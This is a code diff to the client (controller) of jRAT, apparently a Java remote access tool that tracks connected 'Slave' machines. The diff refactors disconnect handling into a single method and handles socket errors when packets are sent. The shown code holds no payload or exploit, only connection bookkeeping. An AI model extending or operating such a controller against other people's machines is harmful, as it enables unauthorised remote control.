@@ -3,6 +3,7 @@ package se.jrat.client;
 import java.awt.TrayIcon;
 import java.io.DataOutputStream;
 import java.net.Socket;
+import java.net.SocketException;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
@@ -88,27 +89,16 @@ public class Slave extends AbstractSlave {
 			}
 		} catch (Exception ex) {
 			ex.printStackTrace();
-			String message = ex.getClass().getSimpleName() + ": " + ex.getMessage();
-
-			Main.instance.getPanelLog().addEntry("Disconnect", this, message);
-
-			if (ex instanceof BadPaddingException) {
-				message += ", is the encryption key matching?";
-			}
-
-			try {
-				ConnectionHandler.removeSlave(this, ex);
-			} catch (Exception e) {
-			}
-
-			TrayIconUtils.showMessage(Main.instance.getTitle(), "Server " + getIP() + " disconnected: " + message, TrayIcon.MessageType.ERROR);
-			PluginEventHandler.onDisconnect(this);
+			disconnect(ex);
 		}
 	}
 	
 	public synchronized void addToSendQueue(AbstractOutgoingPacket packet) {
 		try {
 			sendPacket(packet, dos);
+		} catch (SocketException e) {
+			e.printStackTrace();
+			disconnect(e);
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
@@ -116,6 +106,21 @@ public class Slave extends AbstractSlave {
 
 	public void sendPacket(AbstractOutgoingPacket packet, DataOutputStream dos) throws Exception {
 		packet.send(this, dos);
+	}
+	
+	public void disconnect(Exception ex) {
+		String message = ex.getClass().getSimpleName() + ": " + ex.getMessage();
+
+		Main.instance.getPanelLog().addEntry("Disconnect", this, message);
+
+		try {
+			ConnectionHandler.removeSlave(this, ex);
+		} catch (Exception e) {
+			
+		}
+
+		TrayIconUtils.showMessage(Main.instance.getTitle(), "Server " + getIP() + " disconnected: " + message, TrayIcon.MessageType.ERROR);
+		PluginEventHandler.onDisconnect(this);
 	}
 
 	@Override
